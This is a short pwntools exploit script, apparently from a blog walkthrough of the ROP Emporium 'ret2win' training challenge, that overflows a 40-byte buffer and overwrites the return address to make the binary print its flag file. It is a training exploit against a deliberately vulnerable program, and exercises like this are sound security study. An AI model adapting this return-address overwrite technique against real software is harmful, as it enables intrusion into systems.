#Author:    Christoffer.Claesson@Securitybits.io
#Blog:      https://blog.securitybits.io/2019/08/08/ropemporium-0-ret2win/

#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('ret2win')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 31337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

junk = 'A'*40                       #junk with the offset to overwrite the RIP Register
ret2win = p64(exe.symbols.ret2win)  #gadget which execute /bin/cat flag.txt

payload = ""                        #payload that will be sent to the binary
payload += junk
payload += ret2win

io = start()

io.recvuntil('> ')                  #pwntools function "Recieve data until symbol"
io.sendline(payload)                #pwntools function "send specified data ending with carriage return"
io.recvuntil(':')
log.success('Flag: ' + io.recv(1024))   #log the flag in a pretty format
